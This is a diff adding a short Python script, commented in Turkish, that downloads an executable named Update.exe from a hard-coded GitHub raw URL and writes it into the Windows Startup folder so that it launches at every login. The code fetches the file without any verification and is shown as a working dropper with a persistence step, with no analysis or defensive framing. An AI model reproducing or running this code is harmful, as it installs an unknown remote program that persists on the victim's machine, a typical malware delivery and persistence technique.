@@ -1,0 +1,42 @@
+import os
+import requests
+import subprocess
+import sys
+
+def download_and_add_to_startup(url):
+    # %APPDATA% yolunu çözümleyin
+    appdata_path = os.environ.get('APPDATA')
+    if not appdata_path:
+        print("APPDATA çevre değişkeni bulunamadı.")
+        return
+    
+    # Startup klasörünün yolu
+    startup_folder = os.path.join(appdata_path, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    
+    # Eğer klasör mevcut değilse, oluştur
+    if not os.path.exists(startup_folder):
+        os.makedirs(startup_folder)
+    
+    # Dosyayı URL'den indir
+    try:
+        response = requests.get(url, stream=True)
+        response.raise_for_status()  # Hata kontrolü (200 OK olmalı)
+        
+        # Dosya adı URL'den çıkarılır
+        exe_name = url.split("/")[-1]
+        target_path = os.path.join(startup_folder, exe_name)
+        
+        # Dosyayı hedef yoluna kaydet
+        with open(target_path, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=8192):
+                file.write(chunk)
+        
+        print(f"{exe_name} başarıyla indirildi ve başlangıç klasörüne eklendi.")
+    
+    except requests.exceptions.RequestException as e:
+        print(f"Dosya indirilirken hata oluştu: {e}")
+
+if __name__ == "__main__":
+    # Buraya indirmek istediğiniz exe dosyasının URL'sini girin
+    url = "https://raw.githubusercontent.com/Miladvescim/Ddd/refs/heads/main/Miada/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Update.exe"  # URL'yi buraya girin.
+    download_and_add_to_startup(url)
